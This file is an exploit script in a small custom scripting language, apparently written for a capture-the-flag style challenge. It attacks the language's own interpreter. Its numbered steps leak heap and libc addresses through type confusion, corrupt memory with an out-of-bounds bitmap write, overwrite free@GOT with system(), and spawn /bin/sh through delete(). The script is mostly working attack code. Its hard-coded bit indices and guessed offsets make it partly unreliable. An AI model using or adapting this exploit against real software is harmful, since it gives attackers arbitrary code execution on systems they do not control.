print("=== Final RCE Exploit ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 4: Create target variable");
int target = 0;
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 5: Calculate addresses");
print("Note: targetaddr is string struct address, not variable entry");
print("Variable entry is before string struct, exact offset unknown");
print("Trying different offsets to find correct one:");
int entryaddr1 = targetaddr - 512;
int entryaddr2 = targetaddr - 768;
int entryaddr3 = targetaddr - 1024;
int entryaddr4 = targetaddr - 1280;
print("Trying offset -512 first:");
int valueptraddr = entryaddr1 + 40;
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("Calculated bit_index (offset -512):");
print(bitindex);
print("If this doesn't work, try -768, -1024, or -1280");
print("Using this bit_index for write operations");
print();
print("=== IMPORTANT: Copy the bit_index value above ===");
print("Then run: python3 rce_exploit_dynamic.py <bit_index>");
print("This will generate the write code for Step 6");
print("Replace the set() calls below with the generated code");

print("Step 6: Write free@GOT to value_ptr");
print("free@GOT = 0x409018 (4202520)");
print("Using free@GOT so printf still works");
print("Writing 64 bits starting at calculated bit_index...");
print("Note: bit_index is calculated above, but bitscript cannot use variables in set()");
print("This script needs to be regenerated with correct bit_index for each run");
print("Use: python3 rce_generate_write_code.py <bit_index> 4202520");
set(b1, 35648, 0, 0);
set(b1, 35649, 0, 0);
set(b1, 35650, 0, 0);
set(b1, 35651, 0, 1);
set(b1, 35652, 0, 1);
set(b1, 35653, 0, 0);
set(b1, 35654, 0, 0);
set(b1, 35655, 0, 0);
set(b1, 35656, 0, 0);
set(b1, 35657, 0, 0);
set(b1, 35658, 0, 0);
set(b1, 35659, 0, 0);
set(b1, 35660, 0, 1);
set(b1, 35661, 0, 0);
set(b1, 35662, 0, 0);
set(b1, 35663, 0, 1);
set(b1, 35664, 0, 0);
set(b1, 35665, 0, 0);
set(b1, 35666, 0, 0);
set(b1, 35667, 0, 0);
set(b1, 35668, 0, 0);
set(b1, 35669, 0, 0);
set(b1, 35670, 0, 1);
set(b1, 35671, 0, 0);
set(b1, 35672, 0, 0);
set(b1, 35673, 0, 0);
set(b1, 35674, 0, 0);
set(b1, 35675, 0, 0);
set(b1, 35676, 0, 0);
set(b1, 35677, 0, 0);
set(b1, 35678, 0, 0);
set(b1, 35679, 0, 0);
set(b1, 35680, 0, 0);
set(b1, 35681, 0, 0);
set(b1, 35682, 0, 0);
set(b1, 35683, 0, 0);
set(b1, 35684, 0, 0);
set(b1, 35685, 0, 0);
set(b1, 35686, 0, 0);
set(b1, 35687, 0, 0);
set(b1, 35688, 0, 0);
set(b1, 35689, 0, 0);
set(b1, 35690, 0, 0);
set(b1, 35691, 0, 0);
set(b1, 35692, 0, 0);
set(b1, 35693, 0, 0);
set(b1, 35694, 0, 0);
set(b1, 35695, 0, 0);
set(b1, 35696, 0, 0);
set(b1, 35697, 0, 0);
set(b1, 35698, 0, 0);
set(b1, 35699, 0, 0);
set(b1, 35700, 0, 0);
set(b1, 35701, 0, 0);
set(b1, 35702, 0, 0);
set(b1, 35703, 0, 0);
set(b1, 35704, 0, 0);
set(b1, 35705, 0, 0);
set(b1, 35706, 0, 0);
set(b1, 35707, 0, 0);
set(b1, 35708, 0, 0);
set(b1, 35709, 0, 0);
set(b1, 35710, 0, 0);
set(b1, 35711, 0, 0);

print("Write completed");

print("Step 7: Verify corruption");
print("target.value_ptr should now point to free@GOT");
int verify = target;
print("Reading target (should be free@GOT address 4202520):");
print(verify);
if (verify == 4202520) {
    print("SUCCESS: target.value_ptr points to free@GOT!");
} else {
    print("FAILED: Write didn't work, still pointing to heap");
    print("Need to adjust bit_index or offsets");
}

print("Step 8: Calculate system_addr");
print("system_addr = leaked - 0x88550 + 0x58750");
print("Calculating at runtime...");
int setvbufoffset = 558416;
int systemoffset = 362320;
int libcbase = leaked - setvbufoffset;
int systemaddr = libcbase + systemoffset;
print("libc_base:");
print(libcbase);
print("system_addr:");
print(systemaddr);

print("Step 9: Use type confusion to create variable for GOT write");
print("Create new variable that will point to free@GOT");
int gotwrite = 0;
string gotwrite = "dummy";
print("gotwrite created with type confusion");

print("Step 10: Corrupt gotwrite.value_ptr to point to free@GOT");
print("gotwrite entry is near target entry");
print("Calculate gotwrite.value_ptr address:");
int gotwriteentry = targetaddr - 704;
int gotwritevalueptr = gotwriteentry + 40;
int gotwriteoffset = gotwritevalueptr - bitmapptr;
int gotwritebitindex = gotwriteoffset * 8;
print("gotwrite.value_ptr bit_index:");
print(gotwritebitindex);
print("Writing free@GOT to gotwrite.value_ptr...");
print();
print("=== IMPORTANT: Copy the gotwrite bit_index value above ===");
print("Then run: python3 rce_exploit_dynamic.py <target_bit_index> <gotwrite_bit_index>");
print("This will generate the write code for Step 10");
print("Replace the set() calls below with the generated code");
print();
print("Using calculated bit_index (will be different each run):");
set(b1, 36160, 0, 0);
set(b1, 36161, 0, 0);
set(b1, 36162, 0, 0);
set(b1, 36163, 0, 1);
set(b1, 36164, 0, 1);
set(b1, 36165, 0, 0);
set(b1, 36166, 0, 0);
set(b1, 36167, 0, 0);
set(b1, 36168, 0, 0);
set(b1, 36169, 0, 0);
set(b1, 36170, 0, 0);
set(b1, 36171, 0, 0);
set(b1, 36172, 0, 1);
set(b1, 36173, 0, 0);
set(b1, 36174, 0, 0);
set(b1, 36175, 0, 1);
set(b1, 36176, 0, 0);
set(b1, 36177, 0, 0);
set(b1, 36178, 0, 0);
set(b1, 36179, 0, 0);
set(b1, 36180, 0, 0);
set(b1, 36181, 0, 0);
set(b1, 36182, 0, 1);
set(b1, 36183, 0, 0);
set(b1, 36184, 0, 0);
set(b1, 36185, 0, 0);
set(b1, 36186, 0, 0);
set(b1, 36187, 0, 0);
set(b1, 36188, 0, 0);
set(b1, 36189, 0, 0);
set(b1, 36190, 0, 0);
set(b1, 36191, 0, 0);
set(b1, 36192, 0, 0);
set(b1, 36193, 0, 0);
set(b1, 36194, 0, 0);
set(b1, 36195, 0, 0);
set(b1, 36196, 0, 0);
set(b1, 36197, 0, 0);
set(b1, 36198, 0, 0);
set(b1, 36199, 0, 0);
set(b1, 36200, 0, 0);
set(b1, 36201, 0, 0);
set(b1, 36202, 0, 0);
set(b1, 36203, 0, 0);
set(b1, 36204, 0, 0);
set(b1, 36205, 0, 0);
set(b1, 36206, 0, 0);
set(b1, 36207, 0, 0);
set(b1, 36208, 0, 0);
set(b1, 36209, 0, 0);
set(b1, 36210, 0, 0);
set(b1, 36211, 0, 0);
print("gotwrite.value_ptr corrupted to point to free@GOT");

print("Step 11: Write system_addr to free@GOT via gotwrite assignment");
print("First verify gotwrite.value_ptr points to free@GOT:");
int gotwriteverify = gotwrite;
print("gotwrite value (should be free@GOT 4202520):");
print(gotwriteverify);
if (gotwriteverify == 4202520) {
    print("SUCCESS: gotwrite.value_ptr points to free@GOT!");
    print("Now assigning system_addr...");
    print("gotwrite has type=int (from type confusion)");
    print("For int assignment, it writes directly to value_ptr");
    print("Assignment: gotwrite = systemaddr");
    print("This writes system_addr to free@GOT!");
    gotwrite = systemaddr;
    print("Assignment completed - free@GOT now contains system_addr");
} else {
    print("FAILED: gotwrite.value_ptr doesn't point to free@GOT");
    print("gotwrite.value_ptr corruption didn't work");
    print("Need to adjust gotwrite bit_index or offsets");
    print("Trying assignment anyway...");
    gotwrite = systemaddr;
}

print("Step 12: Create string with /bin/sh");
string shell = "/bin/sh";
print("String created");

print("Step 13: Trigger shell via delete()");
print("delete(shell) will call free() on the string");
print("Since free@GOT now points to system(), this calls system('/bin/sh')");
delete(shell);
print("Shell should be spawned!");
